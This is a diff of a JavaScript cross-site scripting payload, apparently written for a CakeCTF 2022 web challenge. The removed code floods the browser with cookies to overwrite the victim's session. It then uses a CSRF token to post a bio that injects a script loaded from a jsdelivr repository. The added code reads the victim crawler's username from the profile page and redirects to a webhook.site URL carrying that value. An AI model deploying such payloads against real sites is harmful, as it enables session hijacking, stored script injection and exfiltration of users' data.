@@ -1,27 +1,10 @@
-//send request to / => get the crawler's username
-var result;
-xhr = new XMLHttpRequest();
-xhr.open('GET', '/');
-xhr.onreadystatechange = function(){
-    result = xhr.responseText;
-    dom = new DOMParser();
-    result_parsed = dom.parseFromString(result, 'text/html');
-    title = result_parsed.title; //The title contains the crawler's username
-    
-    //overwrite crawler's session cookie => my session cookie
-    for (let i = 0; i < 700; i++) {
-        document.cookie = `cookie${i}=${i}`;
+var r = new XMLHttpRequest();
+r.open("GET", "http://web1.2022.cakectf.com:8003/", true); 
+r.onreadystatechange = function() { 
+    if (r.readyState == 4){
+        var res = r.response.split('\'s Profile')[0].split('<h1>')[1].replace(/\s/g, '');
+        window.location = 'http://webhook.site/dbf476db-cc47-44b9-9ee0-e481c5a73b06/q=' + res;
     }
-    for (let i = 0; i < 700; i++) {
-        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
-    }
-    document.cookie='session=<my_session_cookie>;path=/';
-    
-    //Update my bio with my csrf_token
-    xhr_2 = new XMLHttpRequest();
-    xhr_2.open('POST', '/api/user/update');
-    xhr_2.withCredentials = true;
-    xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr_2.send("bio=<script src='https://cdn.jsdelivr.net/gh/YoneD19/web@latest/test.js'></script>Title:"+title+"&csrf_token=<my_csrf_token>");
-}
-xhr.send();
+};
+r.withCredentials = true;
+r.send();
